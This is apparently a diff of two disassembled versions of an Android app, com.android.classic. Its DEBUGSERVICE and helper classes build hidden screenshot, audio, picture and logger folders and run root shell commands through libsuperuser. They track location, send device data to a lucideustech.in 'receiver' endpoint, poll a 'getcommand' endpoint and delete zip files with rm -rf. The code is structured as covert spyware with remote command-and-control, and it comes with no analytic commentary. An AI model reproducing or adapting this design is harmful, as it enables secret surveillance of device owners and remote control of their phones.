+      [23] invokestatic #84
         + Methodref [android/os/Environment.getExternalStorageDirectory ()Ljava/io/File;]
-      [26] invokevirtual #113
+      [26] invokevirtual #116
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/Object;)Ljava/lang/StringBuilder;]
       [29] ldc #2
         + String [/Android/data/]
-      [31] invokevirtual #114
+      [31] invokevirtual #117
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [34] invokevirtual #115
+      [34] invokevirtual #118
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
-      [37] invokespecial #104
+      [37] invokespecial #107
         + Methodref [java/io/File.<init> (Ljava/lang/String;)V]
       [40] astore_1 v1
-      [41] new #60
+      [41] new #61
         + Class [java/io/File]
       [44] dup
-      [45] new #66
+      [45] new #67
         + Class [java/lang/StringBuilder]
       [48] dup
-      [49] invokespecial #111
+      [49] invokespecial #114
         + Methodref [java/lang/StringBuilder.<init> ()V]
-      [52] invokestatic #82
+      [52] invokestatic #84
         + Methodref [android/os/Environment.getExternalStorageDirectory ()Ljava/io/File;]
-      [55] invokevirtual #113
+      [55] invokevirtual #116
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/Object;)Ljava/lang/StringBuilder;]
       [58] ldc #3
         + String [/Android/data/settings/]
-      [60] invokevirtual #114
+      [60] invokevirtual #117
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [63] invokevirtual #115
+      [63] invokevirtual #118
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
-      [66] invokespecial #104
+      [66] invokespecial #107
         + Methodref [java/io/File.<init> (Ljava/lang/String;)V]
       [69] astore_2 v2
-      [70] new #60
+      [70] new #61
         + Class [java/io/File]
       [73] dup
-      [74] new #66
+      [74] new #67
         + Class [java/lang/StringBuilder]
       [77] dup
-      [78] invokespecial #111
+      [78] invokespecial #114
         + Methodref [java/lang/StringBuilder.<init> ()V]
-      [81] invokestatic #82
+      [81] invokestatic #84
         + Methodref [android/os/Environment.getExternalStorageDirectory ()Ljava/io/File;]
-      [84] invokevirtual #113
+      [84] invokevirtual #116
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/Object;)Ljava/lang/StringBuilder;]
       [87] ldc #8
         + String [/Android/data/settings/Screenshots/]
-      [89] invokevirtual #114
+      [89] invokevirtual #117
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [92] invokevirtual #115
+      [92] invokevirtual #118
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
-      [95] invokespecial #104
+      [95] invokespecial #107
         + Methodref [java/io/File.<init> (Ljava/lang/String;)V]
       [98] astore_3 v3
-      [99] new #60
+      [99] new #61
         + Class [java/io/File]
       [102] dup
-      [103] new #66
+      [103] new #67
         + Class [java/lang/StringBuilder]
       [106] dup
-      [107] invokespecial #111
+      [107] invokespecial #114
         + Methodref [java/lang/StringBuilder.<init> ()V]
-      [110] invokestatic #82
+      [110] invokestatic #84
         + Methodref [android/os/Environment.getExternalStorageDirectory ()Ljava/io/File;]
-      [113] invokevirtual #113
+      [113] invokevirtual #116
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/Object;)Ljava/lang/StringBuilder;]
       [116] ldc #4
         + String [/Android/data/settings/.nomedia]
-      [118] invokevirtual #114
+      [118] invokevirtual #117
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [121] invokevirtual #115
+      [121] invokevirtual #118
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
-      [124] invokespecial #104
+      [124] invokespecial #107
         + Methodref [java/io/File.<init> (Ljava/lang/String;)V]
       [127] astore v4
-      [129] new #60
+      [129] new #61
         + Class [java/io/File]
       [132] dup
-      [133] new #66
+      [133] new #67
         + Class [java/lang/StringBuilder]
       [136] dup
-      [137] invokespecial #111
+      [137] invokespecial #114
         + Methodref [java/lang/StringBuilder.<init> ()V]
-      [140] invokestatic #82
+      [140] invokestatic #84
         + Methodref [android/os/Environment.getExternalStorageDirectory ()Ljava/io/File;]
-      [143] invokevirtual #113
+      [143] invokevirtual #116
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/Object;)Ljava/lang/StringBuilder;]
       [146] ldc #6
         + String [/Android/data/settings/Logger/]
-      [148] invokevirtual #114
+      [148] invokevirtual #117
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [151] invokevirtual #115
+      [151] invokevirtual #118
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
-      [154] invokespecial #104
+      [154] invokespecial #107
         + Methodref [java/io/File.<init> (Ljava/lang/String;)V]
       [157] astore v5
-      [159] new #60
+      [159] new #61
         + Class [java/io/File]
       [162] dup
-      [163] new #66
+      [163] new #67
         + Class [java/lang/StringBuilder]
       [166] dup
-      [167] invokespecial #111
+      [167] invokespecial #114
         + Methodref [java/lang/StringBuilder.<init> ()V]
-      [170] invokestatic #82
+      [170] invokestatic #84
         + Methodref [android/os/Environment.getExternalStorageDirectory ()Ljava/io/File;]
-      [173] invokevirtual #113
+      [173] invokevirtual #116
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/Object;)Ljava/lang/StringBuilder;]
       [176] ldc #7
         + String [/Android/data/settings/Pictures/]
-      [178] invokevirtual #114
+      [178] invokevirtual #117
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [181] invokevirtual #115
+      [181] invokevirtual #118
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
-      [184] invokespecial #104
+      [184] invokespecial #107
         + Methodref [java/io/File.<init> (Ljava/lang/String;)V]
       [187] astore v6
-      [189] new #60
+      [189] new #61
         + Class [java/io/File]
       [192] dup
-      [193] new #66
+      [193] new #67
         + Class [java/lang/StringBuilder]
       [196] dup
-      [197] invokespecial #111
+      [197] invokespecial #114
         + Methodref [java/lang/StringBuilder.<init> ()V]
-      [200] invokestatic #82
+      [200] invokestatic #84
         + Methodref [android/os/Environment.getExternalStorageDirectory ()Ljava/io/File;]
-      [203] invokevirtual #113
+      [203] invokevirtual #116
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/Object;)Ljava/lang/StringBuilder;]
       [206] ldc #5
         + String [/Android/data/settings/Audio/]
-      [208] invokevirtual #114
+      [208] invokevirtual #117
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [211] invokevirtual #115
+      [211] invokevirtual #118
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
-      [214] invokespecial #104
+      [214] invokespecial #107
         + Methodref [java/io/File.<init> (Ljava/lang/String;)V]
       [217] astore v7
       [219] aload_1 v1
-      [220] invokevirtual #106
+      [220] invokevirtual #109
         + Methodref [java/io/File.mkdirs ()Z]
       [223] pop
       [224] aload_2 v2
-      [225] invokevirtual #106
+      [225] invokevirtual #109
         + Methodref [java/io/File.mkdirs ()Z]
       [228] pop
       [229] aload v5
-      [231] invokevirtual #106
+      [231] invokevirtual #109
         + Methodref [java/io/File.mkdirs ()Z]
       [234] pop
       [235] aload_3 v3
-      [236] invokevirtual #106
+      [236] invokevirtual #109
         + Methodref [java/io/File.mkdirs ()Z]
       [239] pop
       [240] aload v6
-      [242] invokevirtual #106
+      [242] invokevirtual #109
         + Methodref [java/io/File.mkdirs ()Z]
       [245] pop
       [246] aload v7
-      [248] invokevirtual #106
+      [248] invokevirtual #109
         + Methodref [java/io/File.mkdirs ()Z]
       [251] pop
       [252] aload v4
-      [254] invokevirtual #105
+      [254] invokevirtual #108
         + Methodref [java/io/File.createNewFile ()Z]
       [257] pop
       [258] goto +5 (target=263)
@@ -40171,29 +40272,29 @@ Methods (count = 13):
       [1] areturn
       Code attribute exceptions (count = 0):
       Code attribute attributes (attribute count = 0):
-  + Method:       f()V
+  + Method:       g()V
     Access flags: 0x2
-      = private void f()
+      = private void g()
     Class member attributes (count = 1):
     + Code attribute instructions (code length = 1, locals = 1, stack = 0):
       [0] return
       Code attribute exceptions (count = 0):
       Code attribute attributes (attribute count = 0):
-  + Method:       g()V
+  + Method:       h()V
     Access flags: 0x2
-      = private void g()
+      = private void h()
     Class member attributes (count = 1):
     + Code attribute instructions (code length = 17, locals = 1, stack = 1):
-      [0] getstatic #74
+      [0] getstatic #76
         + Fieldref [com/android/classic/helper/d.a Z]
       [3] ifeq +9 (target=12)
       [6] ldc #21
         + String [echo 'Screen On' > /sdcard/Android/data/settings/Logger/bootup.txt]
-      [8] invokestatic #101
-        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
+      [8] invokestatic #104
+        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
       [11] pop
       [12] aload_0 v0
-      [13] invokevirtual #88
+      [13] invokevirtual #90
         + Methodref [com/android/classic/helper/DEBUGSERVICE.b ()V]
       [16] return
       Code attribute exceptions (count = 0):
@@ -40231,8 +40332,8 @@ Constant Pool (count = 134):
   + Class [com/android/classic/DEBUG]
   + Class [com/android/classic/helper/DEBUGSERVICE]
   + Class [com/android/classic/helper/e]
+  + Class [eu/chainfire/libsuperuser/b]
   + Class [eu/chainfire/libsuperuser/c]
-  + Class [eu/chainfire/libsuperuser/d]
   + Class [java/io/IOException]
   + Class [java/lang/Exception]
   + Class [java/lang/String]
@@ -40255,9 +40356,9 @@ Constant Pool (count = 134):
   + Methodref [com/android/classic/helper/DEBUGSERVICE.a (Lorg/apache/http/HttpEntity;)Ljava/lang/String;]
   + Methodref [com/android/classic/helper/DEBUGSERVICE.startActivity (Landroid/content/Intent;)V]
   + Methodref [com/android/classic/helper/e.a ([Ljava/lang/Void;)Ljava/lang/Void;]
+  + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
+  + Methodref [eu/chainfire/libsuperuser/c.a ()Z]
   + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
-  + Methodref [eu/chainfire/libsuperuser/d.a ()Z]
-  + Methodref [eu/chainfire/libsuperuser/d.a (Ljava/lang/String;)Ljava/util/List;]
   + Methodref [java/lang/String.contains (Ljava/lang/CharSequence;)Z]
   + Methodref [java/lang/String.trim ()Ljava/lang/String;]
   + Methodref [java/util/ArrayList.<init> ()V]
@@ -40331,8 +40432,8 @@ Constant Pool (count = 134):
   + Utf8 [contains]
   + Utf8 [did]
   + Utf8 [doInBackground]
+  + Utf8 [eu/chainfire/libsuperuser/b]
   + Utf8 [eu/chainfire/libsuperuser/c]
-  + Utf8 [eu/chainfire/libsuperuser/d]
   + Utf8 [execute]
   + Utf8 [getEntity]
   + Utf8 [http://www.lucideustech.in/androidcp/device/getcommand]
@@ -40496,16 +40597,16 @@ Methods (count = 3):
       [177] iload v11
       [179] ificmplt -68 (target=111)
       [182] invokestatic #38
-        + Methodref [eu/chainfire/libsuperuser/d.a ()Z]
+        + Methodref [eu/chainfire/libsuperuser/c.a ()Z]
       [185] ifeq +12 (target=197)
       [188] aload v8
       [190] invokestatic #39
-        + Methodref [eu/chainfire/libsuperuser/d.a (Ljava/lang/String;)Ljava/util/List;]
+        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
       [193] pop
       [194] goto +24 (target=218)
       [197] aload v8
       [199] invokestatic #37
-        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
+        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
       [202] pop
       [203] goto +15 (target=218)
       [206] astore v7
@@ -40581,7 +40682,7 @@ Constant Pool (count = 141):
   + Class [android/location/LocationManager]
   + Class [android/os/Build]
   + Class [com/android/classic/helper/f]
-  + Class [com/android/classic/helper/g]
+  + Class [com/android/classic/helper/h]
   + Class [java/lang/Exception]
   + Class [java/lang/String]
   + Class [java/lang/StringBuilder]
@@ -40604,8 +40705,8 @@ Constant Pool (count = 141):
   + Methodref [android/location/LocationManager.isProviderEnabled (Ljava/lang/String;)Z]
   + Methodref [android/location/LocationManager.requestLocationUpdates (Ljava/lang/String;JFLandroid/location/LocationListener;)V]
   + Methodref [com/android/classic/helper/f.a ()Landroid/location/Location;]
-  + Methodref [com/android/classic/helper/g.<init> ()V]
-  + Methodref [com/android/classic/helper/g.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
+  + Methodref [com/android/classic/helper/h.<init> ()V]
+  + Methodref [com/android/classic/helper/h.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
   + Methodref [java/lang/Exception.printStackTrace ()V]
   + Methodref [java/lang/String.valueOf (D)Ljava/lang/String;]
   + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
@@ -40678,7 +40779,7 @@ Constant Pool (count = 141):
   + Utf8 [b]
   + Utf8 [c]
   + Utf8 [com/android/classic/helper/f]
-  + Utf8 [com/android/classic/helper/g]
+  + Utf8 [com/android/classic/helper/h]
   + Utf8 [d]
   + Utf8 [e]
   + Utf8 [execute]
@@ -40964,13 +41065,13 @@ Methods (count = 7):
       [252] aastore
       [253] astore_2 v2
       [254] new #13
-        + Class [com/android/classic/helper/g]
+        + Class [com/android/classic/helper/h]
       [257] dup
       [258] invokespecial #37
-        + Methodref [com/android/classic/helper/g.<init> ()V]
+        + Methodref [com/android/classic/helper/h.<init> ()V]
       [261] aload_2 v2
       [262] invokevirtual #38
-        + Methodref [com/android/classic/helper/g.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
+        + Methodref [com/android/classic/helper/h.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
       [265] pop
       [266] goto +8 (target=274)
       [269] astore_1 v1
@@ -41033,6 +41134,187 @@ Methods (count = 7):
       [1] areturn
       Code attribute exceptions (count = 0):
       Code attribute attributes (attribute count = 0):
+
+Class file attributes (count = 1):
+  + Runtime invisible annotations attribute:
+    - Annotation [Landroid/annotation/SuppressLint;]:
+      - Array element value [value]:
+        + Constant element value [(default) '115']
+          + Utf8 [SimpleDateFormat]
+
+_____________________________________________________________________
++ Program class: com/android/classic/helper/g
+  Superclass:    java/lang/Object
+  Major version: 0x32
+  Minor version: 0x0
+  Access flags:  0x21
+    = public class com.android.classic.helper.g extends java.lang.Object
+
+Interfaces (count = 0):
+
+Constant Pool (count = 75):
+  + String [rm -rf /sdcard/*__.zip]
+  + Class [[B]
+  + Class [android/content/Context]
+  + Class [android/content/res/Resources]
+  + Class [com/android/classic/helper/g]
+  + Class [java/io/FileOutputStream]
+  + Class [java/io/InputStream]
+  + Class [java/lang/Object]
+  + Class [java/lang/String]
+  + Class [java/nio/channels/FileChannel]
+  + Class [java/util/zip/GZIPInputStream]
+  + Fieldref [com/android/classic/helper/g.a [Ljava/lang/String;]
+  + Methodref [android/content/Context.getResources ()Landroid/content/res/Resources;]
+  + Methodref [android/content/Context.openFileOutput (Ljava/lang/String;I)Ljava/io/FileOutputStream;]
+  + Methodref [android/content/res/Resources.openRawResource (I)Ljava/io/InputStream;]
+  + Methodref [java/io/FileOutputStream.close ()V]
+  + Methodref [java/io/FileOutputStream.flush ()V]
+  + Methodref [java/io/FileOutputStream.getChannel ()Ljava/nio/channels/FileChannel;]
+  + Methodref [java/io/FileOutputStream.write ([BII)V]
+  + Methodref [java/nio/channels/FileChannel.force (Z)V]
+  + Methodref [java/util/zip/GZIPInputStream.<init> (Ljava/io/InputStream;)V]
+  + Methodref [java/util/zip/GZIPInputStream.close ()V]
+  + Methodref [java/util/zip/GZIPInputStream.read ([B)I]
+  + NameAndType [<init> (Ljava/io/InputStream;)V]
+  + NameAndType [a [Ljava/lang/String;]
+  + NameAndType [close ()V]
+  + NameAndType [flush ()V]
+  + NameAndType [force (Z)V]
+  + NameAndType [getChannel ()Ljava/nio/channels/FileChannel;]
+  + NameAndType [getResources ()Landroid/content/res/Resources;]
+  + NameAndType [openFileOutput (Ljava/lang/String;I)Ljava/io/FileOutputStream;]
+  + NameAndType [openRawResource (I)Ljava/io/InputStream;]
+  + NameAndType [read ([B)I]
+  + NameAndType [write ([BII)V]
+  + Utf8 [()Landroid/content/res/Resources;]
+  + Utf8 [()Ljava/nio/channels/FileChannel;]
+  + Utf8 [()V]
+  + Utf8 [(I)Ljava/io/InputStream;]
+  + Utf8 [(ILjava/lang/String;Landroid/content/Context;)V]
+  + Utf8 [(Ljava/io/InputStream;)V]
+  + Utf8 [(Ljava/lang/String;I)Ljava/io/FileOutputStream;]
+  + Utf8 [(Z)V]
+  + Utf8 [([B)I]
+  + Utf8 [([BII)V]
+  + Utf8 [<clinit>]
+  + Utf8 [<init>]
+  + Utf8 [Code]
+  + Utf8 [Landroid/annotation/SuppressLint;]
+  + Utf8 [RuntimeInvisibleAnnotations]
+  + Utf8 [SimpleDateFormat]
+  + Utf8 [StackMapTable]
+  + Utf8 [[B]
+  + Utf8 [[Ljava/lang/String;]
+  + Utf8 [a]
+  + Utf8 [android/content/Context]
+  + Utf8 [android/content/res/Resources]
+  + Utf8 [close]
+  + Utf8 [com/android/classic/helper/g]
+  + Utf8 [flush]
+  + Utf8 [force]
+  + Utf8 [getChannel]
+  + Utf8 [getResources]
+  + Utf8 [java/io/FileOutputStream]
+  + Utf8 [java/io/InputStream]
+  + Utf8 [java/lang/Object]
+  + Utf8 [java/lang/String]
+  + Utf8 [java/nio/channels/FileChannel]
+  + Utf8 [java/util/zip/GZIPInputStream]
+  + Utf8 [openFileOutput]
+  + Utf8 [openRawResource]
+  + Utf8 [read]
+  + Utf8 [rm -rf /sdcard/*__.zip]
+  + Utf8 [value]
+  + Utf8 [write]
+
+Fields (count = 1):
+  + Field:        a [Ljava/lang/String;
+    Access flags: 0x8
+      = static java.lang.String[] a
+
+Methods (count = 2):
+  - Method:       <clinit>()V
+    Access flags: 0x8
+      = static void <clinit>()
+    Class member attributes (count = 1):
+    + Code attribute instructions (code length = 13, locals = 0, stack = 4):
+      [0] iconst_1
+      [1] anewarray #9
+        + Class [java/lang/String]
+      [4] dup
+      [5] iconst_0
+      [6] ldc #1
+        + String [rm -rf /sdcard/*__.zip]
+      [8] aastore
+      [9] putstatic #12
+        + Fieldref [com/android/classic/helper/g.a [Ljava/lang/String;]
+      [12] return
+      Code attribute exceptions (count = 0):
+      Code attribute attributes (attribute count = 0):
+  + Method:       a(ILjava/lang/String;Landroid/content/Context;)V
+    Access flags: 0x9
+      = public static void a(int,java.lang.String,android.content.Context)
+    Class member attributes (count = 1):
+    + Code attribute instructions (code length = 85, locals = 8, stack = 4):
+      [0] aload_2 v2
+      [1] invokevirtual #13
+        + Methodref [android/content/Context.getResources ()Landroid/content/res/Resources;]
+      [4] iload_0 v0
+      [5] invokevirtual #15
+        + Methodref [android/content/res/Resources.openRawResource (I)Ljava/io/InputStream;]
+      [8] astore_3 v3
+      [9] aload_2 v2
+      [10] aload_1 v1
+      [11] iconst_1
+      [12] invokevirtual #14
+        + Methodref [android/content/Context.openFileOutput (Ljava/lang/String;I)Ljava/io/FileOutputStream;]
+      [15] astore v4
+      [17] new #11
+        + Class [java/util/zip/GZIPInputStream]
+      [20] dup
+      [21] aload_3 v3
+      [22] invokespecial #21
+        + Methodref [java/util/zip/GZIPInputStream.<init> (Ljava/io/InputStream;)V]
+      [25] astore v5
+      [27] sipush 1024
+      [30] newarray 8
+      [32] astore v6
+      [34] goto +13 (target=47)
+      [37] aload v4
+      [39] aload v6
+      [41] iconst_0
+      [42] iload v7
+      [44] invokevirtual #19
+        + Methodref [java/io/FileOutputStream.write ([BII)V]
+      [47] aload v5
+      [49] aload v6
+      [51] invokevirtual #23
+        + Methodref [java/util/zip/GZIPInputStream.read ([B)I]
+      [54] dup
+      [55] istore v7
+      [57] ifge -20 (target=37)
+      [60] aload v5
+      [62] invokevirtual #22
+        + Methodref [java/util/zip/GZIPInputStream.close ()V]
+      [65] aload v4
+      [67] invokevirtual #18
+        + Methodref [java/io/FileOutputStream.getChannel ()Ljava/nio/channels/FileChannel;]
+      [70] iconst_1
+      [71] invokevirtual #20
+        + Methodref [java/nio/channels/FileChannel.force (Z)V]
+      [74] aload v4
+      [76] invokevirtual #17
+        + Methodref [java/io/FileOutputStream.flush ()V]
+      [79] aload v4
+      [81] invokevirtual #16
+        + Methodref [java/io/FileOutputStream.close ()V]
+      [84] return
+      Code attribute exceptions (count = 0):
+      Code attribute attributes (attribute count = 1):
+      + Stack map table attribute (count = 2):
+        - [37] Var: [i][a:java/lang/String][a:android/content/Context][a:java/io/InputStream][a:java/io/FileOutputStream][a:java/util/zip/GZIPInputStream][a:[B][i], Stack: 
+        - [47] Var: -1, Stack: (empty)
 
 Class file attributes (count = 1):
   + Runtime invisible annotations attribute:
@@ -41182,12 +41464,12 @@ Methods (count = 2):
 Class file attributes (count = 0):
 
 _____________________________________________________________________
-+ Program class: com/android/classic/helper/g
++ Program class: com/android/classic/helper/h
   Superclass:    android/os/AsyncTask
   Major version: 0x32
   Minor version: 0x0
   Access flags:  0x21
-    = public class com.android.classic.helper.g extends android.os.AsyncTask
+    = public class com.android.classic.helper.h extends android.os.AsyncTask
 
 Interfaces (count = 0):
 
@@ -41200,7 +41482,7 @@ Constant Pool (count = 87):
   + Class [[Ljava/lang/String;]
   + Class [android/os/AsyncTask]
   + Class [android/os/Build]
-  + Class [com/android/classic/helper/g]
+  + Class [com/android/classic/helper/h]
   + Class [java/lang/Exception]
   + Class [java/lang/String]
   + Class [java/util/ArrayList]
@@ -41211,10 +41493,10 @@ Constant Pool (count = 87):
   + Class [org/apache/http/impl/client/DefaultHttpClient]
   + Class [org/apache/http/message/BasicNameValuePair]
   + Fieldref [android/os/Build.MODEL Ljava/lang/String;]
-  + Fieldref [com/android/classic/helper/g.a Ljava/lang/String;]
+  + Fieldref [com/android/classic/helper/h.a Ljava/lang/String;]
   + Methodref [android/os/AsyncTask.<init> ()V]
-  + Methodref [com/android/classic/helper/g.a (Ljava/lang/String;)V]
-  + Methodref [com/android/classic/helper/g.a ([Ljava/lang/String;)Ljava/lang/String;]
+  + Methodref [com/android/classic/helper/h.a (Ljava/lang/String;)V]
+  + Methodref [com/android/classic/helper/h.a ([Ljava/lang/String;)Ljava/lang/String;]
   + Methodref [java/lang/Exception.getMessage ()Ljava/lang/String;]
   + Methodref [java/util/ArrayList.<init> ()V]
   + Methodref [org/apache/http/client/entity/UrlEncodedFormEntity.<init> (Ljava/util/List;)V]
@@ -41257,7 +41539,7 @@ Constant Pool (count = 87):
   + Utf8 [add]
   + Utf8 [android/os/AsyncTask]
   + Utf8 [android/os/Build]
-  + Utf8 [com/android/classic/helper/g]
+  + Utf8 [com/android/classic/helper/h]
   + Utf8 [data]
   + Utf8 [did]
   + Utf8 [doInBackground]
@@ -41287,7 +41569,7 @@ Fields (count = 1):
 Methods (count = 6):
   - Method:       <init>()V
     Access flags: 0x1
-      = public g()
+      = public h()
     Class member attributes (count = 1):
     + Code attribute instructions (code length = 11, locals = 1, stack = 2):
       [0] aload_0 v0
@@ -41297,7 +41579,7 @@ Methods (count = 6):
       [5] ldc #4
         + String [http://www.lucideustech.in/androidcp/device/receiver]
       [7] putfield #20
-        + Fieldref [com/android/classic/helper/g.a Ljava/lang/String;]
+        + Fieldref [com/android/classic/helper/h.a Ljava/lang/String;]
       [10] return
       Code attribute exceptions (count = 0):
       Code attribute attributes (attribute count = 0):
@@ -41341,7 +41623,7 @@ Methods (count = 6):
       [20] dup
       [21] aload_0 v0
       [22] getfield #20
-        + Fieldref [com/android/classic/helper/g.a Ljava/lang/String;]
+        + Fieldref [com/android/classic/helper/h.a Ljava/lang/String;]
       [25] invokespecial #27
         + Methodref [org/apache/http/client/methods/HttpPost.<init> (Ljava/lang/String;)V]
       [28] astore v5
@@ -41432,8 +41714,8 @@ Methods (count = 6):
       + Class [java/lang/Exception]
       Code attribute attributes (attribute count = 1):
       + Stack map table attribute (count = 2):
-        - [139] Var: [a:com/android/classic/helper/g][a:[Ljava/lang/String;][a:java/lang/String][a:java/lang/String][a:org/apache/http/client/HttpClient][a:org/apache/http/client/methods/HttpPost][a:org/apache/http/message/BasicNameValuePair][a:org/apache/http/message/BasicNameValuePair][a:org/apache/http/message/BasicNameValuePair][a:java/util/List][a:org/apache/http/client/entity/UrlEncodedFormEntity], Stack: [a:java/lang/Exception]
-        - [147] Var: [a:com/android/classic/helper/g][a:[Ljava/lang/String;][a:java/lang/String][a:java/lang/String][a:org/apache/http/client/HttpClient][a:org/apache/http/client/methods/HttpPost][a:org/apache/http/message/BasicNameValuePair][a:org/apache/http/message/BasicNameValuePair][a:org/apache/http/message/BasicNameValuePair][a:java/util/List], Stack: [a:java/lang/Exception]
+        - [139] Var: [a:com/android/classic/helper/h][a:[Ljava/lang/String;][a:java/lang/String][a:java/lang/String][a:org/apache/http/client/HttpClient][a:org/apache/http/client/methods/HttpPost][a:org/apache/http/message/BasicNameValuePair][a:org/apache/http/message/BasicNameValuePair][a:org/apache/http/message/BasicNameValuePair][a:java/util/List][a:org/apache/http/client/entity/UrlEncodedFormEntity], Stack: [a:java/lang/Exception]
+        - [147] Var: [a:com/android/classic/helper/h][a:[Ljava/lang/String;][a:java/lang/String][a:java/lang/String][a:org/apache/http/client/HttpClient][a:org/apache/http/client/methods/HttpPost][a:org/apache/http/message/BasicNameValuePair][a:org/apache/http/message/BasicNameValuePair][a:org/apache/http/message/BasicNameValuePair][a:java/util/List], Stack: [a:java/lang/Exception]
   + Method:       onPostExecute(Ljava/lang/Object;)V
     Access flags: 0x1004
       = protected synthetic void onPostExecute(java.lang.Object)
@@ -41444,7 +41726,7 @@ Methods (count = 6):
       [2] checkcast #11
         + Class [java/lang/String]
       [5] invokevirtual #22
-        + Methodref [com/android/classic/helper/g.a (Ljava/lang/String;)V]
+        + Methodref [com/android/classic/helper/h.a (Ljava/lang/String;)V]
       [8] return
       Code attribute exceptions (count = 0):
       Code attribute attributes (attribute count = 0):
@@ -41458,7 +41740,7 @@ Methods (count = 6):
       [2] checkcast #6
         + Class [[Ljava/lang/String;]
       [5] invokevirtual #23
-        + Methodref [com/android/classic/helper/g.a ([Ljava/lang/String;)Ljava/lang/String;]
+        + Methodref [com/android/classic/helper/h.a ([Ljava/lang/String;)Ljava/lang/String;]
       [8] areturn
       Code attribute exceptions (count = 0):
       Code attribute attributes (attribute count = 0):
@@ -41466,12 +41748,12 @@ Methods (count = 6):
 Class file attributes (count = 0):
 
 _____________________________________________________________________
-+ Program class: com/android/classic/helper/h
++ Program class: com/android/classic/helper/i
   Superclass:    android/os/AsyncTask
   Major version: 0x32
   Minor version: 0x0
   Access flags:  0x21
-    = public class com.android.classic.helper.h extends android.os.AsyncTask
+    = public class com.android.classic.helper.i extends android.os.AsyncTask
 
 Interfaces (count = 0):
 
@@ -41495,8 +41777,8 @@ Constant Pool (count = 167):
   + Class [[Ljava/lang/String;]
   + Class [android/os/AsyncTask]
   + Class [android/os/Build]
-  + Class [com/android/classic/helper/h]
-  + Class [eu/chainfire/libsuperuser/c]
+  + Class [com/android/classic/helper/i]
+  + Class [eu/chainfire/libsuperuser/b]
   + Class [java/io/DataOutputStream]
   + Class [java/io/File]
   + Class [java/io/FileInputStream]
@@ -41508,11 +41790,11 @@ Constant Pool (count = 167):
   + Class [java/net/HttpURLConnection]
   + Class [java/net/URL]
   + Fieldref [android/os/Build.MODEL Ljava/lang/String;]
-  + Fieldref [com/android/classic/helper/h.a Ljava/lang/String;]
+  + Fieldref [com/android/classic/helper/i.a Ljava/lang/String;]
   + Methodref [android/os/AsyncTask.<init> ()V]
-  + Methodref [com/android/classic/helper/h.a (Ljava/lang/Void;)V]
-  + Methodref [com/android/classic/helper/h.a ([Ljava/lang/String;)Ljava/lang/Void;]
-  + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
+  + Methodref [com/android/classic/helper/i.a (Ljava/lang/Void;)V]
+  + Methodref [com/android/classic/helper/i.a ([Ljava/lang/String;)Ljava/lang/Void;]
+  + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
   + Methodref [java/io/DataOutputStream.<init> (Ljava/io/OutputStream;)V]
   + Methodref [java/io/DataOutputStream.close ()V]
   + Methodref [java/io/DataOutputStream.flush ()V]
@@ -41610,9 +41892,9 @@ Constant Pool (count = 167):
   + Utf8 [append]
   + Utf8 [available]
   + Utf8 [close]
-  + Utf8 [com/android/classic/helper/h]
+  + Utf8 [com/android/classic/helper/i]
   + Utf8 [doInBackground]
-  + Utf8 [eu/chainfire/libsuperuser/c]
+  + Utf8 [eu/chainfire/libsuperuser/b]
   + Utf8 [flush]
   + Utf8 [getOutputStream]
   + Utf8 [getResponseCode]
@@ -41653,7 +41935,7 @@ Fields (count = 1):
 Methods (count = 6):
   - Method:       <init>()V
     Access flags: 0x1
-      = public h()
+      = public i()
     Class member attributes (count = 1):
     + Code attribute instructions (code length = 5, locals = 1, stack = 1):
       [0] aload_0 v0
@@ -41680,7 +41962,7 @@ Methods (count = 6):
       [2] iconst_0
       [3] aaload
       [4] putfield #32
-        + Fieldref [com/android/classic/helper/h.a Ljava/lang/String;]
+        + Fieldref [com/android/classic/helper/i.a Ljava/lang/String;]
       [7] aconst_null
       [8] astore_2 v2
       [9] aconst_null
@@ -41931,9 +42213,9 @@ Methods (count = 6):
       + Class [java/lang/Exception]
       Code attribute attributes (attribute count = 1):
       + Stack map table attribute (count = 4):
